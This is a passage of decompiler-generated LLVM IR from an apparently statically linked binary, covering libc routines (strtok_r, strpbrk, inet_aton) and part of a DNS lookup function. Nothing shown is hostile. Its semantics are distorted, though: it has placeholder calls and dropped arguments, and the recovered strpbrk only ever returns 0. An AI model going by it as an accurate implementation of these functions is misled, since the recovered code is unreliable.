  %v0_100085f4.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_100085d4

dec_label_pc_10008648.dec_label_pc_1000864c_crit_edge: ; preds = %dec_label_pc_10008648.backedge
  %v0_1000864c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000864c

dec_label_pc_1000864c:                            ; preds = %dec_label_pc_10008648.dec_label_pc_1000864c_crit_edge, %dec_label_pc_100085ac
  %v0_1000864c = phi i32 [ %v0_1000864c.pre, %dec_label_pc_10008648.dec_label_pc_1000864c_crit_edge ], [ %v0_100085b0, %dec_label_pc_100085ac ]
  %v1_1000864c = add i32 %v0_1000864c, 1
  store i32 %v1_1000864c, i32* %r5.global-to-local, align 4
  store i32 %v0_1000864c, i32* %ctr.global-to-local, align 4
  %v2_100086643 = icmp eq i32 %v0_1000864c, 0
  br i1 %v2_100086643, label %dec_label_pc_10008668, label %dec_label_pc_10008658

dec_label_pc_10008658:                            ; preds = %dec_label_pc_1000864c, %dec_label_pc_10008658
  %v0_10008658 = load i32, i32* %r3.global-to-local, align 4
  %v1_10008658 = add i32 %v0_10008658, -1
  %v2_10008658 = inttoptr i32 %v1_10008658 to i8*
  %v3_10008658 = load i8, i8* %v2_10008658, align 1
  %v4_10008658 = zext i8 %v3_10008658 to i32
  store i32 %v1_10008658, i32* %r3.global-to-local, align 4
  %v1_1000865c = load i32, i32* %r4.global-to-local, align 4
  %v4_1000865c = icmp eq i32 %v4_10008658, %v1_1000865c
  %v0_10008660 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000865c, i32 %v0_10008660)
  %v0_10008664 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10008664 = add i32 %v0_10008664, -1
  store i32 %v1_10008664, i32* %ctr.global-to-local, align 4
  %v2_10008664 = icmp eq i32 %v1_10008664, 0
  br i1 %v2_10008664, label %dec_label_pc_10008668, label %dec_label_pc_10008658

dec_label_pc_10008668:                            ; preds = %dec_label_pc_10008658, %dec_label_pc_1000864c
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_10008664, { 1, 0 }
  uselistorder i32 %v0_1000864c, { 1, 2, 0 }
  uselistorder i32 %v1_10008648, { 2, 1, 0 }
  uselistorder i32 %v1_100085f8, { 1, 0, 2 }
  uselistorder i32 %v1_100085f0, { 1, 0, 2 }
  uselistorder i32 %v1_100085e0, { 1, 0, 2 }
  uselistorder i32 %v2_100085b4, { 1, 0 }
  uselistorder i32 %v1_100085b0, { 1, 0 }
  uselistorder i32 %v0_100085ac, { 1, 0 }
  uselistorder i32 %v0_100085b0, { 3, 2, 0, 1 }
  uselistorder i32 %v1_100085a4, { 1, 0 }
  uselistorder i32 %v0_100085a0, { 1, 0, 2 }
  uselistorder i32 %v2_10008588, { 2, 0, 1, 3 }
  uselistorder i32 %v1_10008580, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 3, 2, 4, 5, 7, 6, 0 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 9, 5, 2, 3, 4, 6, 7, 8, 10 }
  uselistorder i32* %ctr.global-to-local, { 4, 3, 1, 6, 5, 2, 8, 7, 0 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10008658, { 1, 0 }
  uselistorder label %dec_label_pc_100085d4, { 1, 0 }
  uselistorder label %dec_label_pc_100085a8, { 1, 0 }
}

define i32 @strtok_r(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %v0_10008674 = load i32, i32* @lr, align 4
  store i32 %v0_10008674, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v3_1000867c = icmp eq i32 %arg1, 0
  %v0_10008684 = load i32, i32* @r5, align 4
  store i32 %v0_10008684, i32* %r30.global-to-local, align 4
  %v0_10008688 = load i32, i32* @r4, align 4
  store i32 %v0_10008688, i32* %r29.global-to-local, align 4
  br i1 %v3_1000867c, label %dec_label_pc_10008690, label %dec_label_pc_10008694

dec_label_pc_10008690:                            ; preds = %entry
  %v1_10008690 = inttoptr i32 %v0_10008684 to i32*
  %v2_10008690 = load i32, i32* %v1_10008690, align 4
  store i32 %v2_10008690, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008694

dec_label_pc_10008694:                            ; preds = %entry, %dec_label_pc_10008690
  %v0_10008694 = phi i32 [ %arg1, %entry ], [ %v2_10008690, %dec_label_pc_10008690 ]
  store i32 %v0_10008694, i32* @r3, align 4
  %v1_10008698 = inttoptr i32 %v0_10008694 to i8*
  %v2_10008698 = call i32 @__GI_strspn(i8* %v1_10008698)
  %v0_1000869c = load i32, i32* %r29.global-to-local, align 4
  %v0_100086a0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100086a0 = add i32 %v0_100086a0, %v2_10008698
  %v3_100086a0 = inttoptr i32 %v2_100086a0 to i8*
  %v4_100086a0 = load i8, i8* %v3_100086a0, align 1
  store i32 %v2_100086a0, i32* @r31, align 4
  store i32 %v2_100086a0, i32* @r3, align 4
  %v3_100086ac = icmp eq i8 %v4_100086a0, 0
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_100086ac, label %dec_label_pc_100086b8, label %dec_label_pc_100086c0

dec_label_pc_100086b8:                            ; preds = %dec_label_pc_10008694
  %v1_100086b8 = load i32, i32* %r30.global-to-local, align 4
  %v2_100086b8 = inttoptr i32 %v1_100086b8 to i32*
  store i32 %v2_100086a0, i32* %v2_100086b8, align 4
  br label %dec_label_pc_100086f8

dec_label_pc_100086c0:                            ; preds = %dec_label_pc_10008694
  store i32 268469956, i32* @lr, align 4
  %v3_100086c0 = call i32 @__GI_strpbrk(i8* %v3_100086a0, i32 %v0_1000869c)
  %v4_100086c8 = icmp eq i32 %v3_100086c0, 0
  %v0_100086cc = load i32, i32* @r31, align 4
  store i32 %v0_100086cc, i32* @r3, align 4
  %v2_100086d0 = add i32 %v3_100086c0, 1
  store i32 %v2_100086d0, i32* %r11.global-to-local, align 4
  br i1 %v4_100086c8, label %dec_label_pc_100086d8, label %dec_label_pc_100086e8

dec_label_pc_100086d8:                            ; preds = %dec_label_pc_100086c0
  store i32 268469980, i32* @lr, align 4
  %v4_100086d8 = call i32 @rawmemchr(i32 %v0_100086cc, i32 0, i32 0)
  %v0_100086dc = load i32, i32* @r31, align 4
  store i32 %v0_100086dc, i32* %r0.global-to-local, align 4
  %v1_100086e0 = load i32, i32* %r30.global-to-local, align 4
  %v2_100086e0 = inttoptr i32 %v1_100086e0 to i32*
  store i32 %v4_100086d8, i32* %v2_100086e0, align 4
  br label %dec_label_pc_100086f8

dec_label_pc_100086e8:                            ; preds = %dec_label_pc_100086c0
  %v1_100086c8 = inttoptr i32 %v3_100086c0 to i8*
  store i8 0, i8* %v1_100086c8, align 1
  %v0_100086f0 = load i32, i32* @r31, align 4
  store i32 %v0_100086f0, i32* %r0.global-to-local, align 4
  %v0_100086f4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100086f4 = load i32, i32* %r30.global-to-local, align 4
  %v2_100086f4 = inttoptr i32 %v1_100086f4 to i32*
  store i32 %v0_100086f4, i32* %v2_100086f4, align 4
  br label %dec_label_pc_100086f8

dec_label_pc_100086f8:                            ; preds = %dec_label_pc_100086d8, %dec_label_pc_100086b8, %dec_label_pc_100086e8
  %v0_100086f8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10008674, i32* %r0.global-to-local, align 4
  ret i32 %v0_100086f8

; uselistorder directives
  uselistorder i32 %v3_100086c0, { 2, 0, 1 }
  uselistorder i32 %v2_100086a0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10008694, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder label %dec_label_pc_100086f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008694, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_100087301 = load i32, i32* @r3, align 4
  %v1_100087302 = inttoptr i32 %v0_100087301 to i8*
  %v2_100087303 = load i8, i8* %v1_100087302, align 1
  %v3_100087304 = zext i8 %v2_100087303 to i32
  store i32 %v3_100087304, i32* %r11.global-to-local, align 4
  %v3_100087346 = icmp eq i8 %v2_100087303, 0
  br i1 %v3_100087346, label %dec_label_pc_10008744, label %dec_label_pc_1000873c

dec_label_pc_10008714:                            ; preds = %dec_label_pc_10008718
  %v3_10008718 = zext i8 %v2_10008718 to i32
  %v4_10008724 = icmp eq i32 %v3_10008718, %v1_10008724
  %v0_10008714 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_10008724, i32 %v0_10008714)
  %v0_10008718.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_10008724.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10008718

dec_label_pc_10008718:                            ; preds = %dec_label_pc_1000873c, %dec_label_pc_10008714
  %v1_10008724 = phi i32 [ %v1_100087249, %dec_label_pc_1000873c ], [ %v1_10008724.pre, %dec_label_pc_10008714 ]
  %v0_10008718 = phi i32 [ %tmp, %dec_label_pc_1000873c ], [ %v0_10008718.pre, %dec_label_pc_10008714 ]
  %v1_10008718 = inttoptr i32 %v0_10008718 to i8*
  %v2_10008718 = load i8, i8* %v1_10008718, align 1
  %v1_1000871c = add i32 %v0_10008718, 1
  store i32 %v1_1000871c, i32* %r9.global-to-local, align 4
  %v3_10008720 = icmp eq i8 %v2_10008718, 0
  br i1 %v3_10008720, label %dec_label_pc_1000872c, label %dec_label_pc_10008714

dec_label_pc_1000872c:                            ; preds = %dec_label_pc_10008718
  %v0_1000872c = load i32, i32* @r3, align 4
  %v1_1000872c = add i32 %v0_1000872c, 1
  store i32 %v1_1000872c, i32* @r3, align 4
  %v1_10008730 = inttoptr i32 %v1_1000872c to i8*
  %v2_10008730 = load i8, i8* %v1_10008730, align 1
  %v3_10008730 = zext i8 %v2_10008730 to i32
  store i32 %v3_10008730, i32* %r11.global-to-local, align 4
  %v3_10008734 = icmp eq i8 %v2_10008730, 0
  br i1 %v3_10008734, label %dec_label_pc_10008744, label %dec_label_pc_1000873c

dec_label_pc_1000873c:                            ; preds = %entry, %dec_label_pc_1000872c
  %v1_100087249 = phi i32 [ %v3_10008730, %dec_label_pc_1000872c ], [ %v3_100087304, %entry ]
  store i32 %tmp, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10008718

dec_label_pc_10008744:                            ; preds = %dec_label_pc_1000872c, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_10008718, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r11.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000873c, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_1000874c = icmp eq i8* %arg1, null
  br i1 %v3_1000874c, label %dec_label_pc_10008804, label %dec_label_pc_10008754

dec_label_pc_10008754:                            ; preds = %entry
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_10008768.pre = load i32, i32* @global_var_1001d808, align 4
  br label %dec_label_pc_10008764

dec_label_pc_10008764:                            ; preds = %dec_label_pc_10008754, %dec_label_pc_100087dc
  %v0_100087dc = phi i32 [ 0, %dec_label_pc_10008754 ], [ %v2_100087e4, %dec_label_pc_100087dc ]
  %v0_100087e0 = phi i32 [ 1, %dec_label_pc_10008754 ], [ %v1_100087e0, %dec_label_pc_100087dc ]
  %v0_10008764 = phi i32 [ %tmp, %dec_label_pc_10008754 ], [ %v0_100087643, %dec_label_pc_100087dc ]
  %v1_10008764 = inttoptr i32 %v0_10008764 to i8*
  %v2_10008764 = load i8, i8* %v1_10008764, align 1
  %v3_10008764 = zext i8 %v2_10008764 to i32
  %v1_1000876c = mul nuw nsw i32 %v3_10008764, 2
  %v2_10008770 = add i32 %v1_1000876c, %v3_10008768.pre
  %v3_10008770 = inttoptr i32 %v2_10008770 to i16*
  %v4_10008770 = load i16, i16* %v3_10008770, align 2
  %v1_10008774 = and i16 %v4_10008770, 8
  %v3_10008774 = icmp eq i16 %v1_10008774, 0
  br i1 %v3_10008774, label %dec_label_pc_10008804, label %dec_label_pc_1000877c

dec_label_pc_1000877c:                            ; preds = %dec_label_pc_10008764
  br label %dec_label_pc_10008794

dec_label_pc_10008784:                            ; preds = %dec_label_pc_10008794
  %v1_10008798 = mul i32 %v1_100087e4, 10
  %v2_100087a0 = add i32 %v3_10008794, %v1_10008798
  %v1_10008784 = add i32 %v2_100087a0, -48
  %v1_10008788 = add i32 %v0_100087cc, 1
  %v2_1000878c = icmp sgt i32 %v1_10008784, 255
  br i1 %v2_1000878c, label %dec_label_pc_10008804, label %dec_label_pc_10008794

dec_label_pc_10008794:                            ; preds = %dec_label_pc_10008784, %dec_label_pc_1000877c
  %v1_100087e4 = phi i32 [ %v1_10008784, %dec_label_pc_10008784 ], [ 0, %dec_label_pc_1000877c ]
  %v0_100087cc = phi i32 [ %v1_10008788, %dec_label_pc_10008784 ], [ %v0_10008764, %dec_label_pc_1000877c ]
  %v1_10008794 = inttoptr i32 %v0_100087cc to i8*
  %v2_10008794 = load i8, i8* %v1_10008794, align 1
  %v3_10008794 = zext i8 %v2_10008794 to i32
  %v1_1000879c = mul nuw nsw i32 %v3_10008794, 2
  %v2_100087a4 = add i32 %v1_1000879c, %v3_10008768.pre
  %v3_100087a4 = inttoptr i32 %v2_100087a4 to i16*
  %v4_100087a4 = load i16, i16* %v3_100087a4, align 2
  %v5_100087a4 = zext i16 %v4_100087a4 to i32
  %v1_100087a8 = and i32 %v5_100087a4, 8
  %v3_100087a8 = icmp eq i32 %v1_100087a8, 0
  br i1 %v3_100087a8, label %dec_label_pc_100087b0, label %dec_label_pc_10008784

dec_label_pc_100087b0:                            ; preds = %dec_label_pc_10008794
  %v2_100087b0 = icmp sgt i32 %v0_100087e0, 3
  br i1 %v2_100087b0, label %dec_label_pc_100087c8, label %dec_label_pc_100087b8

dec_label_pc_100087b8:                            ; preds = %dec_label_pc_100087b0
  %v3_100087b8 = icmp eq i8 %v2_10008794, 46
  br i1 %v3_100087b8, label %dec_label_pc_100087c0, label %dec_label_pc_10008804

dec_label_pc_100087c0:                            ; preds = %dec_label_pc_100087b8
  %v1_100087c0 = add i32 %v0_100087cc, 1
  br label %dec_label_pc_100087dc

dec_label_pc_100087c8:                            ; preds = %dec_label_pc_100087b0
  %v3_100087c8 = icmp eq i8 %v2_10008794, 0
  %v1_100087cc = add i32 %v0_100087cc, 1
  br i1 %v3_100087c8, label %dec_label_pc_100087dc, label %dec_label_pc_100087d4

dec_label_pc_100087d4:                            ; preds = %dec_label_pc_100087c8
  %v1_100087d4 = and i32 %v5_100087a4, 32
  %v3_100087d4 = icmp eq i32 %v1_100087d4, 0
  br i1 %v3_100087d4, label %dec_label_pc_10008804, label %dec_label_pc_100087dc

dec_label_pc_100087dc:                            ; preds = %dec_label_pc_100087d4, %dec_label_pc_100087c8, %dec_label_pc_100087c0
  %v0_100087643 = phi i32 [ %v1_100087cc, %dec_label_pc_100087d4 ], [ %v1_100087cc, %dec_label_pc_100087c8 ], [ %v1_100087c0, %dec_label_pc_100087c0 ]
  %v1_100087dc = mul i32 %v0_100087dc, 256
  %v1_100087e0 = add nuw nsw i32 %v0_100087e0, 1
  %v2_100087e4 = or i32 %v1_100087e4, %v1_100087dc
  store i32 %v2_100087e4, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_100087e0, 5
  br i1 %tmp10, label %dec_label_pc_10008764, label %dec_label_pc_100087f0

dec_label_pc_100087f0:                            ; preds = %dec_label_pc_100087dc
  %v0_100087f0 = load i32, i32* @r4, align 4
  %v3_100087f0 = icmp eq i32 %v0_100087f0, 0
  %v0_100087f8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100087f0, i32 %v0_100087f8)
  %v0_100087fc = load i32, i32* %r5.global-to-local, align 4
  %v1_100087fc = load i32, i32* @r4, align 4
  %v2_100087fc = inttoptr i32 %v1_100087fc to i32*
  store i32 %v0_100087fc, i32* %v2_100087fc, align 4
  ret i32 1

dec_label_pc_10008804:                            ; preds = %dec_label_pc_100087b8, %dec_label_pc_100087d4, %dec_label_pc_10008764, %dec_label_pc_10008784, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_100087e4, { 1, 0 }
  uselistorder i32 %v1_100087e0, { 1, 0 }
  uselistorder i32 %v0_100087cc, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10008804, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_10008764, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-212 = alloca i16, align 2
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-228 = alloca i32, align 4
  %v0_10008810 = load i32, i32* @lr, align 4
  store i32 %v0_10008810, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r14.global-to-local, align 4
  store i32 512, i32* @r3, align 4
  store i32 %arg2, i32* %r16.global-to-local, align 4
  store i32 %arg3, i32* @r23, align 4
  store i32 268470332, i32* @lr, align 4
  %v0_10008838 = call i32 @malloc()
  store i32 %v0_10008838, i32* @r30, align 4
  store i32 1025, i32* @r3, align 4
  store i32 268470344, i32* @lr, align 4
  %v0_10008844 = call i32 @malloc()
  %v0_10008848 = load i32, i32* @r30, align 4
  %v3_10008848 = icmp eq i32 %v0_10008848, 0
  store i32 %v0_10008844, i32* @r21, align 4
  br i1 %v3_10008848, label %dec_label_pc_10008e04, label %dec_label_pc_10008854

dec_label_pc_10008854:                            ; preds = %entry
  %v3_10008854 = icmp eq i32 %v0_10008844, 0
  br i1 %v3_10008854, label %dec_label_pc_10008e04, label %dec_label_pc_1000885c

dec_label_pc_1000885c:                            ; preds = %dec_label_pc_10008854
  %v0_1000885c = load i32, i32* @r23, align 4
  %v3_1000885c = icmp eq i32 %v0_1000885c, 0
  br i1 %v3_1000885c, label %dec_label_pc_10008e04, label %dec_label_pc_10008864

dec_label_pc_10008864:                            ; preds = %dec_label_pc_1000885c
  %v0_10008864 = load i32, i32* %r14.global-to-local, align 4
  %v1_10008864 = inttoptr i32 %v0_10008864 to i8*
  %v2_10008864 = load i8, i8* %v1_10008864, align 1
  %v3_10008864 = zext i8 %v2_10008864 to i32
  store i32 %v3_10008864, i32* %r0.global-to-local, align 4
  %v3_10008868 = icmp eq i8 %v2_10008864, 0
  br i1 %v3_10008868, label %dec_label_pc_10008e04, label %dec_label_pc_10008870

dec_label_pc_10008870:                            ; preds = %dec_label_pc_10008864
  store i32 %v0_10008864, i32* @r3, align 4
  store i32 268566528, i32* %r29.global-to-local, align 4
  %v0_10008878 = call i32 @__GI_strlen()
  %v0_10008880 = load i32, i32* %r14.global-to-local, align 4
  %v2_10008880 = add i32 %v0_10008880, %v0_10008878
  %v1_10008888 = add i32 %v2_10008880, -1
  %v2_10008888 = inttoptr i32 %v1_10008888 to i8*
  %v3_10008888 = load i8, i8* %v2_10008888, align 1
  %v4_10008888 = zext i8 %v3_10008888 to i32
  store i32 %v4_10008888, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001feb4.434 to i32), i32* %r29.global-to-local, align 4
  %v2_10008890 = ptrtoint i32* %stack_var_-228 to i32
  store i32 %v2_10008890, i32* %r28.global-to-local, align 4
  store i32 %v2_10008890, i32* @r3, align 4
  %v1_1000889c = xor i32 %v4_10008888, 46
  store i32 %v1_1000889c, i32* %r17.global-to-local, align 4
  %v0_100088a0 = call i32 @__pthread_return_void()
  %v0_100088a8 = call i32 @__pthread_return_0()
  %v3_100088b0 = load i32, i32* @global_var_1001d884.435, align 4
  store i32 %v3_100088b0, i32* %r11.global-to-local, align 4
  %v3_100088bc = load i16, i16* @global_var_1001d794.436, align 2
  %v4_100088bc = zext i16 %v3_100088bc to i32
  store i32 %v4_100088bc, i32* @r25, align 4
  %v1_100088c0 = load i32, i32* @r23, align 4
  store i32 %v2_10008890, i32* @r3, align 4
  store i32 0, i32* %r17.global-to-local, align 4
  store i32 -1, i32* @r19, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  store i32 -1, i32* @r22, align 4
  %v2_100088c0 = srem i32 %v3_100088b0, %v1_100088c0
  %v2_100088dc = sub i32 %v3_100088b0, %v2_100088c0
  store i32 %v2_100088dc, i32* %r0.global-to-local, align 4
  store i32 %v2_100088c0, i32* @r26, align 4
  %v0_100088e4 = call i32 @__pthread_return_void()
  %v0_10008df8.pr19 = load i32, i32* %r18.global-to-local, align 4
  %tmp57 = icmp ult i32 %v0_10008df8.pr19, 3
  br i1 %tmp57, label %dec_label_pc_100088ec.lr.ph.lr.ph, label %dec_label_pc_10008e10

dec_label_pc_100088ec.lr.ph.lr.ph:                ; preds = %dec_label_pc_10008870
  %v2_10008904 = ptrtoint i32* %stack_var_-144 to i32
  %v2_10008a18 = ptrtoint i32* %stack_var_-204 to i32
  %v2_10008a78 = ptrtoint i16* %stack_var_-212 to i32
  %v2_10008abc = ptrtoint i32* %stack_var_-248 to i32
  %v3_10008b18 = icmp eq i32 %tmp37, 0
  %v3_10008b24 = icmp eq i32 %tmp36, 3
  %v2_10008ba0 = icmp sgt i32 %tmp35, 0
  %tmp58 = icmp slt i32 %tmp35, 1
  %v2_10008bf4 = ptrtoint i32* %stack_var_-184 to i32
  %v3_10008c20 = icmp eq i32 %tmp33, 0
  %v3_10008b94 = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_100088ec.lr.ph

dec_label_pc_100088ec:                            ; preds = %dec_label_pc_100088ec.lr.ph, %dec_label_pc_10008a9c
  %v0_100088ec = load i32, i32* @r19, align 4
  %v3_100088ec = icmp eq i32 %v0_100088ec, -1
  br i1 %v3_100088ec, label %dec_label_pc_100088fc, label %dec_label_pc_100088f4

dec_label_pc_100088f4:                            ; preds = %dec_label_pc_100088ec
  store i32 268470524, i32* @lr, align 4
  %v1_100088f8 = call i32 @__libc_close(i32 %v0_100088ec)
  br label %dec_label_pc_100088fc

dec_label_pc_100088fc:                            ; preds = %dec_label_pc_100088ec, %dec_label_pc_100088f4
  store i32 %v2_10008904, i32* %r29.global-to-local, align 4
  %v0_10008908 = load i32, i32* @r30, align 4
  store i32 268470544, i32* @lr, align 4
  %v3_1000890c = call i32 @__GI_memset(i32 %v0_10008908, i32 0, i32 512)
  store i32 268470560, i32* @lr, align 4
  %v3_1000891c = call i32 @__GI_memset(i32 %v2_10008904, i32 0, i32 48)
  %v0_10008920 = load i32, i32* @r25, align 4
  %v1_10008920 = add i32 %v0_10008920, 1
  %v1_10008924 = urem i32 %v1_10008920, 65536
  store i32 %v1_10008924, i32* @r25, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10008930 = load i32, i32* @r30, align 4
  store i32 %v1_10008924, i32* %stack_var_-144, align 4
  %v4_10008944 = call i32 @__encode_header(i32* nonnull %stack_var_-144, i32 %v0_10008930, i32 512)
  store i32 %v4_10008944, i32* %r28.global-to-local, align 4
  %v1_10008948 = icmp slt i32 %v4_10008944, 0
  br i1 %v1_10008948, label %dec_label_pc_10008e10, label %dec_label_pc_10008950

dec_label_pc_10008950:                            ; preds = %dec_label_pc_100088fc
  %v0_10008950 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_10008950, i32* @r4, align 4
  %v0_10008958 = load i32, i32* @r21, align 4
  store i32 268566528, i32* %r29.global-to-local, align 4
  store i32 268470628, i32* @lr, align 4
  %v4_10008960 = call i32 @strncpy(i32 %v0_10008958, i32 %v0_10008950, i32 1025)
  store i32 ptrtoint (i32* @global_var_1001d798.384 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_10008890, i32* @r3, align 4
  %v0_10008978 = call i32 @__pthread_return_void()
  %v0_10008980 = call i32 @__pthread_return_0()
  %v0_10008984 = load i32, i32* @r22, align 4
  %v1_10008984 = icmp slt i32 %v0_10008984, 0
  %v0_1000898c = load i32, i32* @r26, align 4
  %v1_1000898c = mul i32 %v0_1000898c, 4
  store i32 %v1_1000898c, i32* %r0.global-to-local, align 4
  %v2_10008990 = add i32 %v1_1000898c, %arg4
  %v3_10008990 = inttoptr i32 %v2_10008990 to i32*
  %v4_10008990 = load i32, i32* %v3_10008990, align 4
  store i32 %v4_10008990, i32* %r29.global-to-local, align 4
  br i1 %v1_10008984, label %dec_label_pc_100089d8, label %dec_label_pc_10008998

dec_label_pc_10008998:                            ; preds = %dec_label_pc_10008950
  %v3_1000899c = load i32, i32* @global_var_1001d88c.438, align 4
  store i32 %v3_1000899c, i32* %r0.global-to-local, align 4
  %v2_100089a0 = icmp slt i32 %v0_10008984, %v3_1000899c
  br i1 %v2_100089a0, label %dec_label_pc_100089a8, label %dec_label_pc_100089d8

dec_label_pc_100089a8:                            ; preds = %dec_label_pc_10008998
  store i32 ptrtoint (i32* @global_var_1000cfa0.439 to i32), i32* @r4, align 4
  %v0_100089b4 = load i32, i32* @r21, align 4
  store i32 268470716, i32* @lr, align 4
  %v4_100089b8 = inttoptr i32 %v0_100089b4 to i8*
  %v5_100089b8 = call i32 @__GI_strncat(i8* %v4_100089b8, i32 ptrtoint (i32* @global_var_1000cfa0.439 to i32), i32 1025, i32 268566528)
  %v0_100089c0 = load i32, i32* @r22, align 4
  %v1_100089c0 = mul i32 %v0_100089c0, 4
  store i32 %v1_100089c0, i32* %r0.global-to-local, align 4
  %v2_100089c8 = add i32 %v1_100089c0, ptrtoint (i32* @global_var_1001fee4.440 to i32)
  %v3_100089c8 = inttoptr i32 %v2_100089c8 to i32*
  %v4_100089c8 = load i32, i32* %v3_100089c8, align 4
  store i32 %v4_100089c8, i32* @r4, align 4
  %v0_100089cc = load i32, i32* @r21, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100089d8.441 to i32), i32* @lr, align 4
  %v4_100089d4 = inttoptr i32 %v0_100089cc to i8*
  %v5_100089d4 = call i32 @__GI_strncat(i8* %v4_100089d4, i32 %v4_100089c8, i32 1025, i32 ptrtoint (i32* @global_var_1001fee4.440 to i32))
  br label %dec_label_pc_100089d8

dec_label_pc_100089d8:                            ; preds = %dec_label_pc_10008998, %dec_label_pc_10008950, %dec_label_pc_100089a8
  store i32 %v2_10008890, i32* @r3, align 4
  %v0_100089e0 = call i32 @__pthread_return_void()
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_100089ec = load i32, i32* @r30, align 4
  %v1_100089ec = load i32, i32* %r28.global-to-local, align 4
  %v2_100089ec = add i32 %v1_100089ec, %v0_100089ec
  %v1_100089f0 = sub i32 512, %v1_100089ec
  %v0_100089f8 = load i32, i32* @r21, align 4
  store i32 %v0_100089f8, i32* %stack_var_-240, align 4
  store i32 268470788, i32* @lr, align 4
  %v4_10008a00 = call i32 @__encode_question(i32* nonnull %stack_var_-240, i32 %v2_100089ec, i32 %v1_100089f0)
  store i32 %v4_10008a00, i32* @r27, align 4
  %v1_10008a04 = icmp slt i32 %v4_10008a00, 0
  br i1 %v1_10008a04, label %dec_label_pc_10008e10, label %dec_label_pc_10008a0c

dec_label_pc_10008a0c:                            ; preds = %dec_label_pc_100089d8
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_10008a14 = load i32, i32* @r29, align 4
  store i16 2, i16* %stack_var_-212, align 2
  store i32 268470820, i32* @lr, align 4
  %v3_10008a20 = inttoptr i32 %v0_10008a14 to i8*
  %v4_10008a20 = call i32 @inet_pton(i32 10, i8* %v3_10008a20, i32 %v2_10008a18)
  %tmp59 = icmp slt i32 %v4_10008a20, 1
  br i1 %tmp59, label %dec_label_pc_10008a34thread-pre-split, label %dec_label_pc_10008a2c

dec_label_pc_10008a2c:                            ; preds = %dec_label_pc_10008a0c
  store i32 10, i32* %r0.global-to-local, align 4
  store i16 10, i16* %stack_var_-212, align 2
  br label %dec_label_pc_10008a34

dec_label_pc_10008a34thread-pre-split:            ; preds = %dec_label_pc_10008a0c
  %v3_10008a34.pr = load i16, i16* %stack_var_-212, align 2
